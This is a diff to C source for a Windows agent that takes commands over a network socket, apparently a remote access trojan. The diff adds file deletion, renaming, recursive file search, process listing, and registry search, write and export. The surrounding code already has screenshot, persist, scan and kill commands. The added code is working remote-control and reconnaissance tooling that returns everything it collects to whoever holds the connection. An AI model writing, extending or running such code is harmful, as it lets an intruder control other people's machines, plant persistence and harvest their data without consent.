@@ -798,6 +798,318 @@ static int cmd_regq(SOCKET s, const char *keypath)
     return send_done(s);
 }
 
+/* -----------------------------------------------------------------------
+ * cmd_del — delete a file
+ * ----------------------------------------------------------------------- */
+static int cmd_del(SOCKET s, const char *arg)
+{
+    char line[MAX_PATH+40];
+    if (!arg||!arg[0]) { send_str(s,"del: usage: del <path>\r\n"); return send_done(s); }
+    if (!DeleteFile(arg)) {
+        wsprintf(line,"del: '%s': %lu\r\n",arg,GetLastError());
+    } else {
+        wsprintf(line,"del: deleted '%s'\r\n",arg);
+    }
+    send_str(s,line); return send_done(s);
+}
+
+/* -----------------------------------------------------------------------
+ * cmd_ren — rename / move a file or directory
+ * ----------------------------------------------------------------------- */
+static int cmd_ren(SOCKET s, const char *arg)
+{
+    const char *sp;
+    char oldp[MAX_PATH], newp[MAX_PATH], line[MAX_PATH*2+16];
+    if (!arg||!arg[0]) { send_str(s,"ren: usage: ren <old> <new>\r\n"); return send_done(s); }
+    sp = arg; while (*sp && *sp != ' ') sp++;
+    if (!*sp) { send_str(s,"ren: missing new name\r\n"); return send_done(s); }
+    lstrcpyn(oldp, arg, (int)(sp-arg)+1);
+    lstrcpyn(newp, sp+1, MAX_PATH);
+    if (!MoveFile(oldp, newp)) {
+        wsprintf(line,"ren: failed (%lu)\r\n",GetLastError());
+    } else {
+        wsprintf(line,"ren: '%s' -> '%s'\r\n",oldp,newp);
+    }
+    send_str(s,line); return send_done(s);
+}
+
+/* -----------------------------------------------------------------------
+ * cmd_find — recursive file search
+ * ----------------------------------------------------------------------- */
+static int g_find_count;   /* reused across recursive calls per search */
+static SOCKET g_find_sock;
+
+static void find_recurse(const char *dir, const char *pat)
+{
+    WIN32_FIND_DATA wfd;
+    HANDLE h;
+    char   spath[MAX_PATH], subdir[MAX_PATH];
+
+    wsprintf(spath, "%s\\%s", dir, pat);
+    h = FindFirstFile(spath, &wfd);
+    if (h != INVALID_HANDLE_VALUE) {
+        do {
+            if (!(wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+                wsprintf(spath, "%s\\%s\r\n", dir, wfd.cFileName);
+                send_str(g_find_sock, spath);
+                g_find_count++;
+            }
+        } while (FindNextFile(h, &wfd));
+        FindClose(h);
+    }
+    wsprintf(spath, "%s\\*", dir);
+    h = FindFirstFile(spath, &wfd);
+    if (h != INVALID_HANDLE_VALUE) {
+        do {
+            if ((wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
+                wfd.cFileName[0] != '.') {
+                wsprintf(subdir, "%s\\%s", dir, wfd.cFileName);
+                find_recurse(subdir, pat);
+            }
+        } while (FindNextFile(h, &wfd));
+        FindClose(h);
+    }
+}
+
+static int cmd_find(SOCKET s, const char *arg)
+{
+    const char *sp;
+    char root[MAX_PATH], pat[MAX_PATH], line[64];
+    if (!arg||!arg[0]) { send_str(s,"find: usage: find [<root>] <pattern>\r\n"); return send_done(s); }
+    sp = arg; while (*sp && *sp != ' ') sp++;
+    if (!*sp) {
+        GetCurrentDirectory(MAX_PATH, root);
+        lstrcpyn(pat, arg, MAX_PATH);
+    } else {
+        lstrcpyn(root, arg, (int)(sp-arg)+1);
+        lstrcpyn(pat, sp+1, MAX_PATH);
+    }
+    g_find_count = 0; g_find_sock = s;
+    find_recurse(root, pat);
+    wsprintf(line, "%d file(s) found\r\n", g_find_count);
+    send_str(s, line);
+    return send_done(s);
+}
+
+/* -----------------------------------------------------------------------
+ * cmd_tasklist — enhanced process list (ToolHelp32 + module paths)
+ * ----------------------------------------------------------------------- */
+#define TC_TH32CS_SNAPMODULE 0x00000008UL
+typedef struct {
+    DWORD  dwSize; DWORD  th32ModuleID; DWORD  th32ProcessID;
+    DWORD  GlblcntUsage; DWORD  ProccntUsage;
+    BYTE  *modBaseAddr; DWORD  modBaseSize; HMODULE hModule;
+    char   szModule[MAX_PATH]; char szExePath[MAX_PATH];
+} TC_ME32;
+typedef BOOL (WINAPI *PFN_M32F)(HANDLE, TC_ME32*);
+typedef BOOL (WINAPI *PFN_M32N)(HANDLE, TC_ME32*);
+
+static int cmd_tasklist(SOCKET s)
+{
+    HMODULE  hK   = GetModuleHandle("kernel32.dll");
+    PFN_CTS  fCTS  = hK ? (PFN_CTS) GetProcAddress(hK,"CreateToolhelp32Snapshot") : NULL;
+    PFN_P32F fP32F = hK ? (PFN_P32F)GetProcAddress(hK,"Process32First") : NULL;
+    PFN_P32N fP32N = hK ? (PFN_P32N)GetProcAddress(hK,"Process32Next")  : NULL;
+    PFN_M32F fM32F = hK ? (PFN_M32F)GetProcAddress(hK,"Module32First") : NULL;
+    PFN_M32N fM32N = hK ? (PFN_M32N)GetProcAddress(hK,"Module32Next")  : NULL;
+    HANDLE   snap, msnap;
+    TC_PE32  pe;
+    TC_ME32  me;
+    char     line[MAX_PATH+80];
+
+    if (!fCTS||!fP32F||!fP32N) {
+        send_str(s,"tasklist: ToolHelp32 not available\r\n"); return send_done(s);
+    }
+    snap = fCTS(TC_TH32CS_SNAPPROCESS,0);
+    if (snap==INVALID_HANDLE_VALUE) { send_str(s,"tasklist: snapshot failed\r\n"); return send_done(s); }
+
+    send_str(s,"  PID  Thds  Parent  Image\r\n");
+    send_str(s,"-----  ----  ------  -----\r\n");
+    pe.dwSize = sizeof(pe);
+    if (fP32F(snap,&pe)) do {
+        char exepath[MAX_PATH];
+        lstrcpy(exepath, pe.szExeFile);
+        if (fM32F && fM32N) {
+            msnap = fCTS(TC_TH32CS_SNAPMODULE, pe.th32ProcessID);
+            if (msnap != INVALID_HANDLE_VALUE) {
+                me.dwSize = sizeof(me);
+                if (fM32F(msnap,&me) && me.szExePath[0])
+                    lstrcpyn(exepath, me.szExePath, MAX_PATH);
+                CloseHandle(msnap);
+            }
+        }
+        wsprintf(line,"%5lu  %4lu  %6lu  %s\r\n",
+                 pe.th32ProcessID,pe.cntThreads,pe.th32ParentProcessID,exepath);
+        send_str(s,line);
+    } while (fP32N(snap,&pe));
+    CloseHandle(snap);
+    return send_done(s);
+}
+
+/* -----------------------------------------------------------------------
+ * Registry helpers
+ * ----------------------------------------------------------------------- */
+static const char *parse_hive(const char *keypath, HKEY *out_hive)
+{
+    struct { const char *n; HKEY h; } hives[] = {
+        {"HKLM\\",HKEY_LOCAL_MACHINE},{"HKEY_LOCAL_MACHINE\\",HKEY_LOCAL_MACHINE},
+        {"HKCU\\",HKEY_CURRENT_USER}, {"HKEY_CURRENT_USER\\",HKEY_CURRENT_USER},
+        {"HKCR\\",HKEY_CLASSES_ROOT}, {"HKEY_CLASSES_ROOT\\",HKEY_CLASSES_ROOT},
+        {"HKU\\", HKEY_USERS},        {"HKEY_USERS\\",HKEY_USERS},
+        {"HKLM",HKEY_LOCAL_MACHINE},  {"HKCU",HKEY_CURRENT_USER},
+    };
+    int i;
+    for (i=0; i<(int)(sizeof(hives)/sizeof(hives[0])); i++) {
+        int n = lstrlen(hives[i].n);
+        if (nc_nicmp(keypath, hives[i].n, n) == 0) { *out_hive = hives[i].h; return keypath+n; }
+    }
+    return NULL;
+}
+
+/* -----------------------------------------------------------------------
+ * cmd_regs — recursive registry string search
+ * ----------------------------------------------------------------------- */
+static int g_regs_count;
+static SOCKET g_regs_sock;
+static char   g_regs_term[256];
+
+static void regs_recurse(HKEY hbase, const char *path)
+{
+    HKEY  hkey;
+    DWORD idx, vsz, dsz, vtype, nskcnt;
+    char  vname[256], line[800];
+    BYTE  vdata[512];
+
+    if (RegOpenKeyEx(hbase, path, 0, KEY_READ, &hkey) != ERROR_SUCCESS) return;
+
+    for (idx=0; ; idx++) {
+        vsz=sizeof(vname); dsz=sizeof(vdata); vtype=0;
+        if (RegEnumValue(hkey,idx,vname,&vsz,NULL,&vtype,vdata,&dsz) != ERROR_SUCCESS) break;
+        if (vtype==REG_SZ||vtype==REG_EXPAND_SZ) {
+            const char *d = (const char *)vdata;
+            int  tl = lstrlen(g_regs_term), dl = lstrlen(d), j;
+            for (j=0; j<=dl-tl; j++) {
+                if (nc_nicmp(d+j, g_regs_term, tl)==0) {
+                    wsprintf(line,"[%s] \"%s\"=\"%s\"\r\n",path,vname,d);
+                    send_str(g_regs_sock,line); g_regs_count++; break;
+                }
+            }
+        }
+    }
+    nskcnt = 0;
+    RegQueryInfoKey(hkey,NULL,NULL,NULL,&nskcnt,NULL,NULL,NULL,NULL,NULL,NULL,NULL);
+    for (idx=0; idx<nskcnt; idx++) {
+        char subname[256], fullpath[512];
+        DWORD namesz = sizeof(subname);
+        if (RegEnumKeyEx(hkey,idx,subname,&namesz,NULL,NULL,NULL,NULL)!=ERROR_SUCCESS) break;
+        wsprintf(fullpath,"%s\\%s",path,subname);
+        regs_recurse(hkey, subname);   /* relative from hkey */
+    }
+    RegCloseKey(hkey);
+}
+
+static int cmd_regs(SOCKET s, const char *arg)
+{
+    const char *sp;
+    char keypath[512], line[80];
+    HKEY hive; const char *subkey;
+
+    if (!arg||!arg[0]) { send_str(s,"regs: usage: regs <key> <term>\r\n"); return send_done(s); }
+    sp=arg; while(*sp&&*sp!=' ') sp++;
+    if (!*sp) { send_str(s,"regs: missing search term\r\n"); return send_done(s); }
+    lstrcpyn(keypath, arg, (int)(sp-arg)+1);
+    lstrcpyn(g_regs_term, sp+1, sizeof(g_regs_term));
+    subkey = parse_hive(keypath, &hive);
+    if (!subkey) { send_str(s,"regs: unknown hive\r\n"); return send_done(s); }
+    g_regs_count=0; g_regs_sock=s;
+    regs_recurse(hive, subkey);
+    wsprintf(line,"%d match(es)\r\n",g_regs_count); send_str(s,line);
+    return send_done(s);
+}
+
+/* -----------------------------------------------------------------------
+ * cmd_rege — set a REG_SZ registry value (creates key if needed)
+ * ----------------------------------------------------------------------- */
+static int cmd_rege(SOCKET s, const char *arg)
+{
+    const char *p1, *p2;
+    char keypath[512], valname[256], data[512], line[256];
+    HKEY hive, hkey; const char *subkey; DWORD disp;
+
+    if (!arg||!arg[0]) { send_str(s,"rege: usage: rege <key> <name> <data>\r\n"); return send_done(s); }
+    p1=arg; while(*p1&&*p1!=' ') p1++;
+    if (!*p1) { send_str(s,"rege: missing value name\r\n"); return send_done(s); }
+    lstrcpyn(keypath, arg, (int)(p1-arg)+1);
+    p2=p1+1; while(*p2&&*p2!=' ') p2++;
+    if (!*p2) { send_str(s,"rege: missing data\r\n"); return send_done(s); }
+    lstrcpyn(valname, p1+1, (int)(p2-p1));
+    lstrcpyn(data, p2+1, sizeof(data));
+
+    subkey = parse_hive(keypath, &hive);
+    if (!subkey) { send_str(s,"rege: unknown hive\r\n"); return send_done(s); }
+    if (RegCreateKeyEx(hive,subkey,0,NULL,0,KEY_SET_VALUE,NULL,&hkey,&disp) != ERROR_SUCCESS) {
+        wsprintf(line,"rege: cannot open/create key (%lu)\r\n",GetLastError());
+        send_str(s,line); return send_done(s);
+    }
+    RegSetValueEx(hkey, valname, 0, REG_SZ, (BYTE*)data, (DWORD)lstrlen(data)+1);
+    RegCloseKey(hkey);
+    wsprintf(line,"rege: set [%s] \"%s\"\r\n",keypath,valname);
+    send_str(s,line); return send_done(s);
+}
+
+/* -----------------------------------------------------------------------
+ * cmd_regx — recursive registry export (regedit-compatible .reg format)
+ * ----------------------------------------------------------------------- */
+static SOCKET g_regx_sock;
+
+static void regx_recurse(HKEY hbase, const char *path, const char *hive_prefix)
+{
+    HKEY  hkey;
+    DWORD idx, vsz, dsz, vtype, nskcnt;
+    char  vname[256], line[1024];
+    BYTE  vdata[512];
+
+    if (RegOpenKeyEx(hbase, path, 0, KEY_READ, &hkey) != ERROR_SUCCESS) return;
+
+    wsprintf(line,"\r\n[%s\\%s]\r\n", hive_prefix, path); send_str(g_regx_sock, line);
+
+    for (idx=0; ; idx++) {
+        vsz=sizeof(vname); dsz=sizeof(vdata); vtype=0;
+        if (RegEnumValue(hkey,idx,vname,&vsz,NULL,&vtype,vdata,&dsz)!=ERROR_SUCCESS) break;
+        switch(vtype) {
+        case REG_SZ:
+            wsprintf(line,"\"%s\"=\"%s\"\r\n",vname[0]?vname:"@",(char*)vdata); break;
+        case REG_DWORD:
+            wsprintf(line,"\"%s\"=dword:%08lX\r\n",vname[0]?vname:"@",*(DWORD*)vdata); break;
+        default:
+            wsprintf(line,"\"%s\"=<type%lu,%lu bytes>\r\n",vname[0]?vname:"@",vtype,dsz); break;
+        }
+        send_str(g_regx_sock, line);
+    }
+    nskcnt = 0;
+    RegQueryInfoKey(hkey,NULL,NULL,NULL,&nskcnt,NULL,NULL,NULL,NULL,NULL,NULL,NULL);
+    for (idx=0; idx<nskcnt; idx++) {
+        char subname[256], fullpath[512];
+        DWORD namesz=sizeof(subname);
+        if (RegEnumKeyEx(hkey,idx,subname,&namesz,NULL,NULL,NULL,NULL)!=ERROR_SUCCESS) break;
+        wsprintf(fullpath,"%s\\%s",path,subname);
+        regx_recurse(hkey, subname, hive_prefix);
+    }
+    RegCloseKey(hkey);
+}
+
+static int cmd_regx(SOCKET s, const char *arg)
+{
+    HKEY hive; const char *subkey;
+    if (!arg||!arg[0]) { send_str(s,"regx: usage: regx <key>\r\n"); return send_done(s); }
+    subkey = parse_hive(arg, &hive);
+    if (!subkey) { send_str(s,"regx: unknown hive\r\n"); return send_done(s); }
+    send_str(s,"Windows Registry Editor Version 5.00\r\n");
+    g_regx_sock = s;
+    regx_recurse(hive, subkey, arg);
+    return send_done(s);
+}
+
 static int cmd_screenshot(SOCKET s)
 {
     int   w, h;
@@ -2301,6 +2613,13 @@ static void run_session(SOCKET s)
         else if(cmd_is(cmd,"less"))       rc=cmd_less(s,cmd_arg(cmd,"less"));
         else if(cmd_is(cmd,"persist"))    rc=cmd_persist(s,cmd_arg(cmd,"persist"));
         else if(cmd_is(cmd,"scan"))       rc=cmd_scan(s,cmd_arg(cmd,"scan"));
+        else if(cmd_is(cmd,"del"))        rc=cmd_del(s,cmd_arg(cmd,"del"));
+        else if(cmd_is(cmd,"ren"))        rc=cmd_ren(s,cmd_arg(cmd,"ren"));
+        else if(cmd_is(cmd,"find"))       rc=cmd_find(s,cmd_arg(cmd,"find"));
+        else if(cmd_is(cmd,"tasklist"))   rc=cmd_tasklist(s);
+        else if(cmd_is(cmd,"regs"))       rc=cmd_regs(s,cmd_arg(cmd,"regs"));
+        else if(cmd_is(cmd,"rege"))       rc=cmd_rege(s,cmd_arg(cmd,"rege"));
+        else if(cmd_is(cmd,"regx"))       rc=cmd_regx(s,cmd_arg(cmd,"regx"));
         else if(cmd_is(cmd,"env"))        rc=cmd_env(s);
         else if(cmd_is(cmd,"kill"))       rc=cmd_kill(s,cmd_arg(cmd,"kill"));
         else if(cmd_is(cmd,"pinfo"))      rc=cmd_pinfo(s,cmd_arg(cmd,"pinfo"));
